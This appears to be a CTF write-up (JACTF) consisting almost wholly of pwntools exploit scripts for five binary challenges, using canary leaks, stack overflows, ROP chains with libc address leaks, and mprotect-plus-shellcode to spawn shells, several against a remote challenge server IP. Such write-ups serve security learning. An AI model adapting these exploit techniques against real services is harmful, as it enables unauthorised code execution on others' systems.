# JACTF

## babystack

```python
from pwn import *
from LibcSearcher import *

# p = process('/home/nop/Desktop/babystack')
p = remote('149.129.103.121',10001)

payload = 'A'*0x88 + 'B'    # 'B' cover the canary lower 8 bit

p.recv()
p.send('1') # choice 1 option to input payload
p.send(payload)
sleep(0.1)
p.send('2') # choice 2 option to get the value of canary
p.recvuntil('B')    # when get character 'B', store the value
canary = u64('\x00'+p.recv(7))  # add the lower 8 bit('\x00')
log.info('canary = %#x',canary)

p.recv()    # read the trash data
p.send('1') # choice 1 option to couse stack overflow

pop_rdi = 0x400a93
elf = ELF('/home/nop/Desktop/babystack')
puts_plt = elf.symbols['puts']
read_got = elf.got['read']
log.info('puts_plt = %#x, read_got = %#x'%(puts_plt,read_got))

payload1 = 'A'*0x88 + p64(canary) + 'B'*8
payload1 += p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(0x400720)
p.send(payload1)
sleep(3)
p.recvuntil("\n>> ")    # read the trash data
p.send('3') # choice 3 option to make the stack crash
sleep(1)
read_addr = u64(p.recv()[:6].ljust(8,'\x00'))
log.info('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("system_addr = %#x, binsh_addr = %#x"%(system_addr,binsh_addr))
sleep(1)

p.send('1') # choice 1 option to couse stack overflow

payload2 = 'A'*0x88 + p64(canary) + 'B'*8
payload2 += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(0x400720)
p.send(payload2)
sleep(0.1)

p.send('3') # choice 3 option to make the stack crash
sleep(1)
p.interactive()
```

## guess

```python
from pwn import *
from LibcSearcher import *


# p = process('/home/nop/Desktop/guess')
p = remote('149.129.103.121',10003)
elf = ELF('/home/nop/Desktop/guess')
lib = ELF('/home/nop/Desktop/libc.so.6')

puts_plt = elf.symbols['puts']
read_got = elf.got['read']
log.info("puts_plt = %#x, read_got = %#x"%(puts_plt,read_got))
pop_rdi = 0x4012ab
start = 0x401080

p.recvuntil('please input your name\n')
p.send('nop')   # whatever just input
p.recvuntil("Let's start a game,can you guess the key?\n")

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(read_got)    # transfer the read@got to function puts
payload += p64(puts_plt)    # call th function puts
payload += p64(start)   # set the return address,make process restart

p.send(payload)
p.recvuntil("fail!\n")
read_addr = u64(p.recv()[:6].ljust(8,'\x00'))
log.info("read_addr = %#x",read_addr)

# libc = LibcSearcher('read',read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')

system_addr = read_addr - (lib.symbols['read'] - lib.symbols['system'])
binsh_addr = read_addr - (lib.symbols['read']- next(lib.search("/bin/sh")))
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

p.send('nop')   # whatever just input
p.recvuntil("Let's start a game,can you guess the key?\n")

payload1 = 'A'*40
payload1 += p64(pop_rdi)    # ransfer the binsh_addr to function puts
payload1 += p64(binsh_addr)
payload1 += p64(system_addr)    # call system
payload1 += p64(start)  # put the return address,could put aything of course

p.send(payload1)
sleep(3)
p.interactive()
```

## pwn test

```python
from pwn import *

p = process('./pwn1')
# p = process('149.129.103.121',10005)
elf = ELF('./pwn1')
scanf_plt = elf.symbols['__isoc99_scanf']
system_plt = elf.symbols['system']
format_addr=0x08048629
bin_sh = 0x804a044

p.recv()
payload = 'a'*52+p32(scanf_plt)+p32(0x08048531)+p32(format_addr)+p32(bin_sh)
p.sendline(payload)
sleep(0.1)
p.sendline('/bin/sh\x00')
sleep(0.1)
payload1 = 'b'*44+p32(system_plt)+p32(0x08048531)+p32(bin_sh)
p.sendline(payload1)
p.interactive()
```

## pwn100

```python
from pwn import *
from LibcSearcher import *

# p = process("/home/nop/Desktop/pwn100")
p = remote('149.129.103.121',10006)
elf = ELF("/home/nop/Desktop/pwn100")

read_got = elf.got['read']
puts_plt = elf.symbols['puts']
log.info("read_got = %#x, puts_plt = %#x"%(read_got,puts_plt))

start = 0x400550
pop_rdi = 0x0400763

payload = 'A'*0x48
payload += p64(pop_rdi) # transfer the read@got to puts
payload += p64(read_got)
payload += p64(puts_plt)    # call puts
payload += p64(start)   # set the return address
payload = payload.ljust(200,'B')    # pading the length of paylaod to 200

print 'sending payload...'
for i in range(200):
    p.send(payload[i])
    if i==199:
        print "work done!"
    sleep(0.1)
p.recvuntil("bye~\n")
read_addr = u64(p.recv()[:6].ljust(8,'\x00'))
log.info("read_addr = %#x",read_addr)

libc = LibcSearcher('read',read_addr)
lib_base = read_addr - libc.dump('read')
system_addr = lib_base + libc.dump('system')
binsh_addr = lib_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

payload1 = 'A'*0x48
payload1 += p64(pop_rdi)    # transfer the binsh_addr to system
payload1 += p64(binsh_addr)
payload1 += p64(system_addr)    # call system to get shell
payload1 += p64(start)  # set the return address
payload1 = payload1.ljust(200,'B')

print 'sending payload...'
for i in range(200):
    p.send(payload1[i])
    if i==199:
        print "work done!"
    sleep(0.1)

sleep(3)
p.interactive()
```

## syscall

```python
from pwn import *
from base64 import b64encode
context.arch='amd64'

# the program was complied staticlly, there are not system or the syscall number of execve,
# but we could change some segiment's policy to write shellcode and execute, this way could get shell locally,
# I could not connect to the server, so I don't konw if it's work on server yet.

p = process('../Desktop/syscall')
# p = remote('149.129.103.121',10009)
elf = ELF('../Desktop/syscall',checksec=False)

main = elf.sym['main']
mprotect_addr = elf.sym['mprotect']
read_addr = elf.sym['read']

pop_rdx_rsi = 0x0000000000443409 # pop rdx ; pop rsi ; ret
pop_rdi = 0x0000000000401e36 # pop rdi ; ret
shellcode_addr = 0x00000000006CA000
shellcode = asm(shellcraft.sh())

# leak the value of canary
p.recvuntil(">")
p.sendline(b64encode('A'*8+'B'))    # cover the canary lowest byte,to leak it
p.recvuntil("B")
canary = u64('\x00'+p.recv(7))
log.success('canary = %#x',canary)

p.recvuntil("continue ?")
p.sendline('A')
p.recvuntil(">")

# change the policy which start at 0x00000000006CA000 and end at 0x00000000006CA000+len(shellcode)
payload = 'A'*0x8 + p64(canary) + 'A'*0x8
payload += flat([
    pop_rdx_rsi, 0x7, len(shellcode), pop_rdi, shellcode_addr, mprotect_addr, main
    ])
p.sendline(b64encode(payload))

p.recvuntil("continue ?")
# end the circulation to make stack overflow
p.sendline('no')
sleep(1)

# write shellcode to address 0f 0x00000000006CA000 and execute it
p.recvuntil(">")
payload = 'A'*0x8 + p64(canary) + 'A'*0x8
payload += flat([
    pop_rdx_rsi, len(shellcode), shellcode_addr, pop_rdi, 0, read_addr, shellcode_addr
    ])
p.sendline(b64encode(payload))

p.recvuntil("continue ?")
# end the circulation to make stack overflow
p.sendline('no')
sleep(1)

p.send(shellcode)

sleep(1)
p.interactive()
```
